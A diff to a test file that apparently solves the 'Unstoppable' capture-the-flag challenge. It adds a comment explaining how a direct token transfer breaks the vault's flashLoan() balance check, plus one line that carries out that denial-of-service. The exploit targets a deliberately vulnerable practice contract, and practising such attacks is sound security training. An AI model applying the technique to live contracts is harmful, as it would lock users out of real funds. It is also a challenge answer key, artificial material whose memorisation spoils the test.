@@ -44,7 +44,15 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* 
+            By transfering directly some tokens from player to vault we will make the following check inside flashLoan() revert:
+                - if (convertToShares(totalSupply) != balanceBefore)
+            
+            This will cause revert because: 
+                - balanceBefore is the total balance of the vault (1m + our transfer)
+                - totalSupply is the total supply of DVT tokens (1m)
+        */
+        await token.transfer(vault.address, 1)
     });
 
     after(async function () {
